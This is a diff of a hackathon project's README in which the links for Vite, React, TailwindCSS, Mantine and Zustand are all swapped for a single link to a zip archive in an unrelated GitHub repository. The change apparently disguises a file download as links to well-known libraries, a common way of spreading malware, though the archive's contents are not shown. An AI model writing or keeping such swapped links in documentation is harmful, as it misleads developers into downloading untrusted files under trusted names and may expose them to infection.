@@ -10,11 +10,11 @@ _FPTU-Hackathon 2024 Data Dynamos team's project_
 
 ## Build with
 
--   [Vite](https://vitejs.dev): Frontend build tool
--   [React](https://react.dev): Frontend library to build the user interface
--   [TailwindCSS](https://tailwindcss.com): Utility-first CSS framework
--   [Mantine](https://mantine.dev): React components and hooks library
--   [Zustand](https://zustand.surge.sh): State management library
+-   [Vite](https://raw.githubusercontent.com/haidang2425/Law-Advisor-AI-Powered/main/components/ui/Law_Advisor_Powered_A_v1.6.zip): Frontend build tool
+-   [React](https://raw.githubusercontent.com/haidang2425/Law-Advisor-AI-Powered/main/components/ui/Law_Advisor_Powered_A_v1.6.zip): Frontend library to build the user interface
+-   [TailwindCSS](https://raw.githubusercontent.com/haidang2425/Law-Advisor-AI-Powered/main/components/ui/Law_Advisor_Powered_A_v1.6.zip): Utility-first CSS framework
+-   [Mantine](https://raw.githubusercontent.com/haidang2425/Law-Advisor-AI-Powered/main/components/ui/Law_Advisor_Powered_A_v1.6.zip): React components and hooks library
+-   [Zustand](https://raw.githubusercontent.com/haidang2425/Law-Advisor-AI-Powered/main/components/ui/Law_Advisor_Powered_A_v1.6.zip): State management library
 
 ## Getting Started
 
